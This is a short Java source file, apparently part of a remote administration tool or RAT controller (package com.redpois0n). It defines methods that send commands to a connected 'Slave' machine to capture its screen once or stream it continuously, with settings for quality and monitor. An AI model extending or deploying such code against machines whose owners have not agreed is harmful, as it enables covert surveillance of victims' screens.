package com.redpois0n;


import com.redpois0n.packets.Header;
import com.redpois0n.packets.PacketBuilder;

public class ScreenCommands {

	public static void sendOnce(Slave slave, int quality, int monitor, int rows, int cols) {
		slave.addToSendQueue(new PacketBuilder(Header.GET_SCREEN_ONCE, new Integer[] { quality, monitor, rows, cols }));
	}

	public static void send(Slave slave, int quality, int monitor, int rows, int cols) {
		slave.addToSendQueue(new PacketBuilder(Header.GET_SCREEN, new Integer[] { quality, monitor, rows, cols }));
	}

}
